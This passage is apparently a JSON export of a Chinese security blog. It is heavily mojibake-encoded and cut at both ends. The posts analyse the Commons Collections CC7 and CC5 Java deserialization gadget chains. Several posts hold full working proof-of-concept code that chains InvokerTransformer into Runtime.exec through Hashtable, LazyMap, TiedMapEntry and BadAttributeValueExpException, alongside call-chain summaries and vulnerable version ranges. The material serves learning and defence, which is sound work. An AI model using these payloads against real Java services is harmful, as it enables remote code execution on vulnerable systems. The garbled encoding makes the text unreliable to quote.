ä¾èµ–ç‰ˆæœ¬\ncommons-beanutils : 1.9.2 commons-collections : 2.0-3.2.2 commons-loggings : 1.2\n","permalink":"http://www.reus09.top/posts/tech/commosbeanutils%E5%88%86%E6%9E%90/","summary":"å®é™…ä¸Šæˆ‘è§‰å¾—åšå®¢å¹¶ä¸æ˜¯åªæ¥è®°å½•ä¸€äº›å­¦ä¹ ã€æŠ€æœ¯ä¸Šçš„æ„Ÿæ‚Ÿï¼Œè®°å½•å­¦ä¹ è¿‡ç¨‹çš„ä¸€äº›å¿ƒç†ä¹Ÿæ˜¯å¾ˆæœ‰æ„ä¹‰çš„ã€‚æœ€è¿‘å‡ å¤©ç¡®å®æ˜¯è¿‡äº†ä¸€æ®µæ¯”è¾ƒèˆ’é€‚æ„‰å¿«çš„ç”Ÿæ´»ï¼Œæ‘†çƒ‚çš„","title":"CommosBeanutilsåˆ†æ"},{"content":"åˆ†æå®ŒCC6ï¼Œè¶çƒ­æ‰“é“ï¼Œç»§ç»­å­¦ä¹ ä¸€ä¸‹CC7çš„åˆ©ç”¨æ–¹æ³•ï¼Œå‘ç°è¿˜æ˜¯å¤§åŒå°å¼‚ï¼Œæ˜¯å¯¹LazyMapè§¦å‘æƒ…å†µçš„åˆä¸€ç§æè¿°ã€‚\nåªä¸è¿‡è¿™æ¬¡ç”¨åˆ°äº†HashTableã€‚å¯¹äºHashTableï¼Œè¿™é‡Œå­¦ä¹ äº†su18å¸ˆå‚…æä¾›çš„ç»§æ‰¿CC6çš„è€è·¯ã€‚\nå®é™…ä¸Šåœ¨ä¹‹åCC7çš„å­¦ä¹ ä¸­ï¼Œå‘ç°äº†HashTableåœ¨CC7é“¾ä¸­çš„è¿ç”¨ä¸ä»…ä»…æ˜¯key.hashcodeä¸€æ¡è·¯ï¼Œå¦‚ysoserialä¸­æä¾›çš„equalsæ–¹æ³•çš„åˆ©ç”¨ï¼Œå¯¹ysoserialçš„CC7è¿›è¡Œç†è§£ï¼Œæ„Ÿè§‰å¯¹JAVAç»§æ‰¿ä¹‹é—´çš„å…³ç³»è°ƒç”¨ç†è§£æ›´åŠ æ·±åˆ»ï¼ŒåŒæ—¶å¯¹hashcodeæ’åº“æ”»å‡»è¿›è¡Œä¸€å®šçš„è®¤çŸ¥ï¼ŒåŒæ—¶æ„Ÿè§‰ysoserialé“¾çš„æ„é€ å¥‡å¦™ï¼Œå› ä¸ºåœ¨åˆ†æé“¾çš„æ—¶å€™ï¼Œå¯¹ä¸ºä»€ä¹ˆè¦æœ€åremoveä¸€ä¸ªlazyMapçš„æ•°æ®æ„Ÿåˆ°å¾ˆå¥‡æ€ªï¼Œç»è¿‡åˆ†ææ„Ÿè§‰ç¡®å®æ˜¯ä¸¥ä¸åˆç¼ã€‚\nä¹‹åä¼šåœ¨å­¦ä¹ çš„åŸºç¡€ä¸Šï¼Œè¿›ä¸€æ­¥çš„åˆ†æysoserialä¸­çš„ååºåˆ—åŒ–é“¾ã€‚\nå‰æçŸ¥è¯† HashTable å…·ä½“åŒºåˆ«è¯¦æƒ…çœ‹su18å¸ˆå‚…çš„ç›¸å…³ä»‹ç»ã€‚\nHashtable çš„ readObject æ–¹æ³•ä¸­ï¼Œæœ€åè°ƒç”¨äº† reconstitutionPut æ–¹æ³•å°†ååºåˆ—åŒ–å¾—åˆ°çš„ key-value æ”¾åœ¨å†…éƒ¨å®ç°çš„ Entry æ•°ç»„ table é‡Œã€‚\nåœ¨reconstitutionPutæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†ååºåˆ—åŒ–åkeyçš„hashcodeã€‚\nMap\u0026amp;AbstractMap\u0026amp;HashMapå…³ç³» å®é™…ä¸Še.key.equals(key)åŒæ ·å¯ä»¥è§¦å‘æ¼æ´ã€‚\nä½†æ˜¯é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆç†æ¸…Mapã€HashMapã€AbstractMapä¹‹é—´çš„ç»§æ‰¿å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦ç”¨åˆ°equalsæ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°HashMapç»§æ‰¿äº†AbstractMapï¼ŒåŒæ—¶éƒ½å®ç°äº†Mapæ¥å£ã€‚\nç„¶åHashMapä¸­æ²¡æœ‰å®ç°equalsæ–¹æ³•ï¼Œä½†æ˜¯åœ¨å…¶çˆ¶ç±»AbstractMapä¸­å®ç°äº†equalsæ–¹æ³•\né‡ç‚¹åˆ†æä¸€ä¸‹AbstractMapä¸­çš„equalsæ–¹æ³•\nè¯¥å‡½æ•°ä¼šè°ƒç”¨mapçš„getæ–¹æ³•ï¼Œç„¶è€ŒLazyMapæ­£å¥½å®ç°Mapæ¥å£ï¼Œå› æ­¤åœ¨è¿™é‡Œå¯ä»¥æœ‰æ‰€ä½œä¸ºã€‚ ä½†æ˜¯è§¦å‘è¿™ä¸ªæ˜¯æœ‰æ¡ä»¶çš„ï¼Œä»¥ä¸‹ä¸‰ä¸ªåˆ¤æ–­éƒ½ä¸èƒ½è¿›å…¥ï¼Œå¦åˆ™ä»£ç æ‰§è¡Œä¸åˆ°è§¦å‘ç‚¹ã€‚\n1 2 3 4 5 6 7 8 if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; æ”»å‡»æ„é€  HashTable \u0026amp; TiedMapEntry é‚£ä¹ˆå…¶å®è¿™ä¸ªè°ƒç”¨é€»è¾‘æ˜¯ä¸ HashMap å·®ä¸å¤šçš„ã€‚\næ”»å‡»ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package CC7; import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; /** * @ClassName CC7 * @Description TODO * @Author reus09 * @Date 2022/10/29 16:01 * @Version 1.0 **/ public class CC7 { public static String fileName = \u0026#34;CC7.bin\u0026#34;; public static void main(String[] args) throws Exception { // åˆå§‹åŒ– HashMap Hashtable\u0026lt;Object, Object\u0026gt; hashtable = new Hashtable\u0026lt;\u0026gt;(); // åˆ›å»º ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; // åˆ›å»ºä¸€ä¸ªç©ºçš„ ChainedTransformer ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{}); // åˆ›å»º LazyMap å¹¶å¼•å…¥ TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), fakeChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); hashtable.put(entry, \u0026#34;reus09\u0026#34;); //ç”¨åå°„å†æ”¹å›çœŸçš„chain Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(fakeChain, transformers); //æ¸…ç©ºç”±äº hashtable.put å¯¹ LazyMap é€ æˆçš„å½±å“ lazyMap.clear(); SeralizeUtil.writeObjectToFile(hashtable, fileName); SeralizeUtil.readFileObject(fileName); } } æ•ˆæœï¼š\nysoserialé“¾ å‰é¢çš„åˆ†ææ­¥éª¤ä¸su18åˆ†æçš„ä¸€æ ·ï¼Œéƒ½æ˜¯è§¦å‘HashTableçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„reconstitutionPutæ–¹æ³•ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯è§¦å‘åœ¨e.key.equals(key)ä¸­ã€‚\ne.key.equals(key)è¿™é‡Œæ˜¯å®Œç¾çš„è¡”æ¥ç‚¹ï¼Œå®ƒå®ç°äº†å°†hashtableå’ŒLazyMapä¹‹é—´ååºåˆ—åŒ–çš„è¿æ¥ã€‚\nPOC ä¸»è¦æ­¥éª¤å¦‚ä¸‹ï¼š\nåˆ›å»ºä¸¤ä¸ªhashmapå’Œä¸¤ä¸ªLazymap å‘lazymapä¸­å¡«å……ä»¥yyå’ŒzZä¸ºkeyçš„ä¸¤ä¸ªé”®å€¼å¯¹ å°†ä¸¤ä¸ªlazymap putè¿›åˆ›å»ºçš„hashtableä¸­ ä¿®æ”¹transformerChainçš„iTransformerså±æ€§ä¸ºå‘½ä»¤æ‰§è¡Œé“¾ åˆ é™¤lazyMap2ä¸­å¤šä½™çš„key å€Ÿç”¨ä¸€ä¸‹å¤§å¸ˆå‚…çš„æµç¨‹å›¾\næ‰€ä»¥POCä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 package CC7; /** * @ClassName CC7WithEquals * @Description TODO * @Author reus09 * @Date 2022/10/30 16:34 * @Version 1.0 **/ import Util.SeralizeUtil; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; /* Payload method chain: java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform org.apache.commons.collections.functors.InvokerTransformer.transform java.lang.reflect.Method.invoke sun.reflect.DelegatingMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke0 java.lang.Runtime.exec */ public class CC7WithEquals { public static void setField(Object obj, String fieldName, Object targetObject) throws NoSuchFieldException, IllegalAccessException { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,targetObject); } public static String fileName = \u0026#34;CC7WithEquals.bin\u0026#34;; public static void main(String[] args) throws Exception { final Transformer transformerChain = new ChainedTransformer(new Transformer[]{}); // åˆ›å»º ChainedTransformer Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a Calculator.app\u0026#34;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1, new ConstantTransformer(0)); lazyMap1.put(\u0026#34;yy\u0026#34;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, new ConstantTransformer(0)); lazyMap2.put(\u0026#34;zZ\u0026#34;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); setField(lazyMap1, \u0026#34;factory\u0026#34;, chainedTransformer); setField(lazyMap2, \u0026#34;factory\u0026#34;, chainedTransformer); // lazyMap2.remove(\u0026#34;yy\u0026#34;); System.out.println(lazyMap1); System.out.println(lazyMap2); System.out.println(lazyMap1.hashCode()); System.out.println(lazyMap2.hashCode()); // SeralizeUtil.writeObjectToFile(hashtable,fileName); SeralizeUtil.readFileObject(fileName); } } é—®é¢˜åˆ†æ 1.ä¸ºä»€ä¹ˆè¦LazyMapä¿®é¥°çš„innerMapä¸ºHashMap è¿™ä¸ªå…¶å®å°±æ˜¯æˆ‘ä»¬åœ¨å‰æçŸ¥è¯†é‡Œé¢æåˆ°çš„ä¸œè¥¿ï¼Œåœ¨æ„é€ LazyMapæ—¶ HashMap ä½œä¸ºdecorateå‚æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¦ä½¿ç”¨HashMapå‘¢ï¼Œå¦‚æœä¸è®¤çœŸåˆ†æè¿™ç‚¹å¾ˆå®¹æ˜“è¢«å¿½ç•¥ã€‚å› ä¸ºè¦ä½¿ç”¨çš„æ˜¯HashMapä¸­çš„equalsæ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªä¼ é€’å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤º\nå‘LazyMapä¼ å…¥Hashmapååœ¨lazymapæ¯”è¾ƒæ—¶ä¼šè°ƒç”¨ç¬¬ä¸€ä¸ªmapçš„equalæ–¹æ³•ï¼ŒåŒæ—¶hashmapç»§æ‰¿äº†AbstractMapç±»ä½†æ²¡æœ‰é‡å†™equalsæ–¹æ³•ï¼Œæ‰€ä»¥æœ€ç»ˆè°ƒç”¨çš„æ˜¯AbstractMapç±»ä¸­çš„equalsæ–¹æ³•ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼ å…¥hashmapçš„åŸå› ã€‚\n2.ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªlazyMap å› ä¸ºæˆ‘ä»¬éœ€è¦è°ƒç”¨equalsæ–¹æ³•ï¼Œæ˜¯éœ€è¦ä¼ é€’ä¸¤ä¸ªä¸åŒçš„LazyMapçš„ï¼Œå› ä¸ºHashTableçš„putæ–¹æ³•ï¼Œå¦‚æœä¼ å…¥çš„lazyMapå’Œä¹‹å‰çš„å…ƒç´ çš„hashcodeå’Œkeyç›¸åŒ¹é…ï¼Œä¼šè®¤ä¸ºæ˜¯åŒä¸€ä¸ªã€‚\n3.ä¸ºä»€ä¹ˆé€‰æ‹© yy å’Œ zZ ä½œä¸ºkeyï¼Ÿ é¦–å…ˆå®ƒä¿©çš„hashCodeç›¸ç­‰\nç„¶åå…¶å®åœ¨Hashtableä¸­çš„reconstitutionPutæ–¹æ³•,è°ƒç”¨equalsçš„æ¡ä»¶ä¹Ÿéœ€è¦æ»¡è¶³hashç›¸åŒã€‚\né‚£ä¸ºä»€ä¹ˆä¸èƒ½æŠŠä¸¤ä¸ªkeyè®¾æˆä¸€æ ·çš„å‘¢ï¼Ÿè¿™æ ·hashå°±ç›¸ç­‰äº†ï¼Œä½†æ˜¯å¦‚æœç»§ç»­å¾€ä¸‹è·Ÿä»£ç çš„è¯å°±ä¼šå‘ç°åœ¨lazymapçš„getæ–¹æ³•ä¸­æœ‰ä»¥ä¸‹é€»è¾‘ï¼Œmapçš„keyä¸èƒ½é‡å¤å¦åˆ™å°±ä¸ä¼šæ‰§è¡Œtransformå‡½æ•°æ‰§è¡Œä»£ç äº†ã€‚ 4.ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ ï¼Ÿ è¿˜æ˜¯å› ä¸ºhashTableçš„putæ–¹æ³•é—®é¢˜ã€‚æˆ‘ä»¬è°ƒè¯•è·Ÿè¿›ä¸€ä¸‹ã€‚\nå¯ä»¥çœ‹åˆ°ï¼Œåœ¨æ²¡æœ‰åŠ å…¥åˆ°hashTableçš„æ—¶å€™ï¼Œä¸¤ä¸ªlazyMapçš„çŠ¶æ€ï¼Œsizeéƒ½ä¸º1\nç„¶åhashTableå‹å…¥lazyMap1ï¼Œæ­¤æ—¶ä»ç„¶æ˜¯æ­£å¸¸çš„ã€‚\nç„¶åhashTableä¸­å‹å…¥lazyMap2,å‘ç°lazyMap2ä¸­çš„å…ƒç´ å˜ä¸ºä¸¤ä¸ªã€‚\né‡Œé¢å…¶å®å°±æ˜¯putæ–¹æ³•åœ¨é‡Œé¢èµ·äº†ä½œç”¨ï¼Œæˆ‘ä»¬æ¥å…·ä½“åˆ†æä¸€ä¸‹ã€‚\nå‹å…¥lazyMap2çš„æ—¶å€™ï¼Œentry.key.equals(key)æ–¹æ³•ä¼šèµ·ä½œç”¨ã€‚\nç„¶åequalsæ–¹æ³•ä¼šä¸€è·¯è§¦å‘ï¼Œä¸€ç›´åˆ°æˆ‘ä»¬åˆ†æçš„AbstractMapçš„equalsæ–¹æ³•é‡Œé¢ï¼Œè€Œåœ¨equalsæ–¹æ³•ä¼šè°ƒç”¨lazyMap.get(key)æ–¹æ³•ï¼Œä»è€Œå®ç°åœ¨lazyMap2ä¸­å°†hashMap1ä¸­çš„å…ƒç´ æ·»åŠ è¿›å»ã€‚ æ‰€ä»¥lazyMap2ä¸­å˜æˆäº†ä¸¤ä¸ªå…ƒç´ ï¼Œä¸ºäº†æ»¡è¶³åé¢ååºåˆ—è¿›å…¥equalsæ–¹æ³•çš„æ¡ä»¶ï¼Œä¸¤ä¸ªlazyMapçš„sizeå¿…é¡»ä¸€è‡´ã€‚\nå› æ­¤éœ€è¦å»é™¤æ‰å¤šä½™çš„å…ƒç´ ã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC7 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š ç”¨ Hashtable ä»£æ›¿ HashMap è§¦å‘ LazyMap æ–¹å¼ï¼Œä¸ CC6 HashMap å‡ ä¹ä¸€è‡´ã€‚ åŒæ—¶å¯¹ysoserialå¯¹äºCC7é“¾çš„åˆ†æè¿›è¡Œäº†å­¦ä¹ ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjava.util.Hashtable#readObject() sink gadgetï¼šorg.apache.commons.collections.functors.InvokerTransformer#transform() chain gadgetï¼šorg.apache.commons.collections.keyvalue.TiedMapEntry#hashCode() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 Hashtable.readObject() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ä¾èµ–ç‰ˆæœ¬\ncommons-collections : 3.1\n","permalink":"http://www.reus09.top/posts/tech/commonscollections7%E5%88%86%E6%9E%90/","summary":"åˆ†æå®ŒCC6ï¼Œè¶çƒ­æ‰“é“ï¼Œç»§ç»­å­¦ä¹ ä¸€ä¸‹CC7çš„åˆ©ç”¨æ–¹æ³•ï¼Œå‘ç°è¿˜æ˜¯å¤§åŒå°å¼‚ï¼Œæ˜¯å¯¹LazyMapè§¦å‘æƒ…å†µçš„åˆä¸€ç§æè¿°ã€‚ åªä¸è¿‡è¿™æ¬¡ç”¨åˆ°äº†HashTa","title":"CommonsCollections7åˆ†æ"},{"content":"è¨€å½’æ­£ä¼ ï¼Œæ˜¨å¤©å·²ç»æå‰çœ‹è¿‡äº†CC5é“¾çš„å…·ä½“æ„é€ ï¼Œä»Šå¤©ä¸»è¦å°±æ˜¯ä¸€äº›è¿è¡Œè°ƒè¯•ã€‚è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚\nCC5 ä¾æ—§æ˜¯ LazyMap åŠ  ChainedTransformer çš„è§¦å‘æ¨¡å¼ï¼Œåªä¸è¿‡ä¸å†ä½¿ç”¨ AnnotationInvocationHandler çš„åŠ¨æ€ä»£ç†æ¥è§¦å‘ LazyMap çš„ get ï¼Œè€Œæ˜¯æ‰¾åˆ°äº†å…¶ä»–çš„æ–¹å¼ã€‚\nå› ä¸º jdk åœ¨ 1.8 ä¹‹åå¯¹ AnnotationInvocationHandler ç±»è¿›è¡Œäº†ä¿®å¤ï¼Œæ‰€ä»¥åœ¨ jdk 1.8 ç‰ˆæœ¬å°±å¿…é¡»æ‰¾å‡ºèƒ½æ›¿ä»£ AnnotationInvocationHandler çš„æ–°çš„å¯ä»¥åˆ©ç”¨çš„ç±»ã€‚\nå‰ç½®çŸ¥è¯† TiedMapEntry org.apache.commons.collections.keyvalue.TiedMapEntry æ˜¯ä¸€ä¸ª Map.Entry çš„å®ç°ç±»ï¼Œä»åç§°ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ªç»‘å®šäº†åº•å±‚ map çš„ Entryï¼Œç”¨æ¥ä½¿ä¸€ä¸ª map entry å¯¹è±¡æ‹¥æœ‰åœ¨åº•å±‚ä¿®æ”¹ map çš„åŠŸèƒ½ã€‚\nTiedMapEntry ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å±æ€§ Mapï¼Œè¿™å°±æ˜¯ Map.Entry çš„åº•å±‚ mapï¼ŒTiedMapEntry çš„ getValue() æ–¹æ³•ä¼šè°ƒç”¨åº•å±‚ map çš„ get() æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥è§¦å‘ LazyMap çš„ getã€‚é‚£è°ä¼šè°ƒç”¨ getValue() æ–¹æ³•å‘¢ï¼Ÿæˆ‘ä»¬å‘ç° TiedMapEntry çš„ equals/hashCode/toString éƒ½å¯ä»¥è§¦å‘ã€‚\nequals/hashCode è®©æˆ‘ä»¬æƒ³åˆ°äº† URLDNS çš„ HashMapï¼Œä¸è¿‡åœ¨ CC5 ä¸­æˆ‘ä»¬ç”¨çš„æ˜¯ toString() æ–¹æ³•ã€‚\næ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘ TiedMapEntry çš„ toString() æ–¹æ³•ã€‚\nä¼ å…¥çš„lazyMapè°ƒç”¨getæ–¹æ³•\nBadAttributeValueExpException javax.management.BadAttributeValueExpException è¿™ä¸ªç±»ï¼Œååºåˆ—åŒ–è¯»å– valï¼Œå½“ System.getSecurityManager() == null æˆ– valObj æ˜¯é™¤äº† String çš„å…¶ä»–åŸºç¡€ç±»å‹æ—¶ä¼šè°ƒç”¨ valObj çš„ toString() æ–¹æ³•ï¼Œå®Œæˆä¸Šé¢ TiedMapEntry çš„æ„é€ ã€‚\næ”»å‡»æ„é€  ä½¿ç”¨ä¸Šè¿°ä¸¤ä¸ªæ–°æ‰©å±•çš„è§¦å‘ç‚¹ï¼Œé…åˆ LazyMap å°±å¯ä»¥å®Œæˆä¸€æ¡æ–°çš„æ”»å‡»è·¯å¾„ã€‚ç”±äº ysoserial ä½¿ç”¨äº† ChainedTransformer + InvokerTransformer çš„æ–¹å¼ï¼Œæˆ‘è¿™é‡Œä¹ŸåŒæ ·ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œå½“ç„¶è¿˜å¯ä»¥ä½¿ç”¨ InvokerTransformer + TemplatesImpl/TrAXFilter + InstantiateTransformer + TemplatesImpl çš„æ–¹å¼è§¦å‘ï¼Œåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­éƒ½æœ‰ä½¿ç”¨ï¼Œè¿™é‡Œä¸å†é‡å¤ç½—åˆ—ã€‚\næœ€ç»ˆçš„æ¶æ„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class CC5 { public static String fileName = \u0026#34;CC5.bin\u0026#34;; public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { // åˆ›å»º ChainedTransformer ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}) }); // åˆ›å»º LazyMap å¹¶å¼•å…¥ TiedMapEntry Map lazyMap = LazyMap.decorate(new HashMap(), chain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \u0026#34;reus09\u0026#34;); // å®ä¾‹åŒ– BadAttributeValueExpException å¹¶åå°„å†™å…¥ BadAttributeValueExpException exception = new BadAttributeValueExpException(\u0026#34;su18\u0026#34;); Field field = BadAttributeValueExpException.class.getDeclaredField(\u0026#34;val\u0026#34;); field.setAccessible(true); field.set(exception, entry); SerializeUtil.writeObjectToFile(exception, fileName); SerializeUtil.readFileObject(fileName); } } è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ï¼Œè™½ç„¶èƒ½å¤Ÿç›´æ¥é€šè¿‡æ„é€ æ–¹æ³•èµ‹å€¼ç»™valï¼Œä½†åœ¨æ„é€ æ–¹æ³•ä¸­æœ‰å¯¹å…¥å‚åštoStringæ“ä½œï¼Œé‚£åœ¨åºåˆ—åŒ–payloadæ—¶ï¼Œå¾—åˆ°çš„valå°±æ˜¯Stringè€Œä¸æ˜¯mapäº†ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åå°„çš„æ–¹å¼å»èµ‹å€¼ç»™valã€‚\næ€»ç»“ ä»¥ä¸Šå°±æ˜¯ CC5 é“¾åˆ†æçš„å…¨éƒ¨å†…å®¹äº†ï¼Œæœ€åæ€»ç»“ä¸€ä¸‹ã€‚\nåˆ©ç”¨è¯´æ˜ï¼š ååºåˆ—åŒ– BadAttributeValueExpException è°ƒç”¨ TiedMapEntry çš„ toString æ–¹æ³•ï¼Œé—´æ¥è°ƒç”¨äº† LazyMap çš„ get æ–¹æ³•ï¼Œè§¦å‘äº†åç»­çš„ Transformer æ¶æ„æ‰§è¡Œé“¾ã€‚ Gadget æ€»ç»“ï¼š kick-off gadgetï¼šjavax.management.BadAttributeValueExpException#readObject() sink gadgetï¼šorg.apache.commons.collections.functors.InvokerTransformer#transform() chain gadgetï¼šorg.apache.commons.collections.keyvalue.TiedMapEntry#toString() è°ƒç”¨é“¾å±•ç¤ºï¼š 1 2 3 4 5 6 BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ä¾èµ–ç‰ˆæœ¬\ncommons-collections : 3.1ï½3.2.1 jdk 8u76 without a security manager\n","permalink":"http://www.reus09.top/posts/tech/commonscollections5%E5%88%86%E6%9E%90/","summary":"è¨€å½’æ­£ä¼ ï¼Œæ˜¨å¤©å·²ç»æå‰çœ‹è¿‡äº†CC5é“¾çš„å…·ä½“æ„é€ ï¼Œä»Šå¤©ä¸»è¦å°±æ˜¯ä¸€äº›è¿è¡Œè°ƒè¯•ã€‚è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ CC5 ä¾æ—§æ˜¯ LazyMap åŠ  ChainedTransformer çš„è§¦å‘æ¨¡å¼ï¼Œåªä¸è¿‡ä¸å†ä½¿ç”¨ AnnotationInvocationHandler çš„åŠ¨æ€ä»£","title":"CommonsCollections5åˆ†æ"},{"content":"å› ä¸ºç”µè„‘çš„ç¼˜æ•…ï¼ŒæŠŠjava 1.7 å’Œ java 1.8çš„ä½ç‰ˆæœ¬éƒ½æ”¾åœ¨windowså³å¦ä¸€å°æœºå™¨ä¸Šé¢ï¼Œæ‰€ä»¥ï¼Œå°±ç®€å•çš„å­¦ä¹ äº†ä¸€ä¸‹CC5é“¾çš„ä¸€äº›åŸç†ï¼Œå…·ä½“å¤ç°ä¹‹åæœ‰æ—¶é—´é…ç½®å¥½ç¯å¢ƒå³å¯ï¼Œä»Šå¤©å°±å…ˆä¸»è¦å­¦ä¹ å¤ç°ä¸€ä¸‹åˆ©ç”¨ç‰ˆæœ¬æ²¡é‚£ä¹ˆè‹›åˆ»çš„CommonsCollections6ã€‚\nç®€å•çœ‹äº†ä¸€ä¸‹CC5çš„åŸç†ï¼Œä¸»è¦æ˜¯javax.management.BadAttributeValueExpExceptionåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨valObjçš„toStringæ–¹æ³•ï¼ŒTiedMapEntry#toStringä¼šè§¦å‘æœ¬èº«çš„getValueä»è€Œè§¦å‘HashMapçš„getæ–¹æ³•ï¼Œä»è€Œè§¦å‘LazyMap,ä»è€Œè§¦å‘RCEé“¾ã€‚\nè¿™é‡Œsu18å¸ˆå‚…æå‡ºäº†ä¸¤æ¡é“¾ï¼Œä¸€ç§æ˜¯ç»§ç»­æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤Ÿè°ƒç”¨TiedMapEntry#getValueæ–¹æ³•å³å¯ï¼Œåœ¨CC5çš„å­¦ä¹ ä¸­ï¼ŒTiedMapEntry#hashcodeæ–¹æ³•ä¹Ÿæ˜¯å¯ä»¥å‡ºå‘getValueæ–¹æ³•çš„ï¼Œè¿™è®©æˆ‘ä»¬æƒ³åˆ°äº†ä¹‹å‰åœ¨URLDNSä¸­çš„å­¦ä¹ ï¼Œå¯¹hashMapçš„putæ–¹æ³•çš„ç»•è¿‡ï¼Œå› 